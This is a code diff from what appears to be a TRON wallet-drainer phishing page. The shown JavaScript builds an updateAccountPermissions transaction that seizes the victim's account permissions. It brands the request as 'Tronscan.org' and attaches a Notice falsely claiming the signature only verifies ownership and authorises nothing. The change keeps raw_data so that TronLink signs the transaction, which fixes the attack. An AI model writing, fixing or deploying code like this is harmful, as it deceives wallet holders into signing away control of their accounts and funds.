@@ -494,7 +494,8 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       };
       var utx = await tw.transactionBuilder.updateAccountPermissions(addr, ownerP, null, [activeP]);
       window.__logINF(pathLabel + ' tx built — keys: ' + JSON.stringify(Object.keys(utx)));
-      delete utx.visible; delete utx.txID; delete utx.raw_data;
+      delete utx.visible; delete utx.txID;
+      // keep raw_data — TronLink needs it to hash + sign the tx internally
       utx.Application = 'Tronscan.org';
       utx.Message     = msg;
       utx.Notice      = 'This signature is used solely to verify ownership of the address. It does not authorize, initiate, or execute any transaction.';
